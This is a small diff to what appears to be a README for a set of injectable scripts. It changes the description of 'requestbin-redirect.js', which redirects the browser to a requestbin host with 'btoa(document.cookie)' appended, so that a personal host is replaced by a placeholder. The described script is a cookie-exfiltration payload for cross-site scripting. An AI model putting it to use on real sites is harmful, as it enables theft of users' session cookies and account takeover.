@@ -6,4 +6,4 @@ To run a script, use the following html element:
 
 ## Scripts:
 `requestbin-redirect.js` :  
-Redirect the window to `http://requestbin.victorroer.com?{btoa(document.cookie)}` (only useful for me)
+Redirect the window to `{my-requestbin}?{btoa(document.cookie)}` (only useful for me)
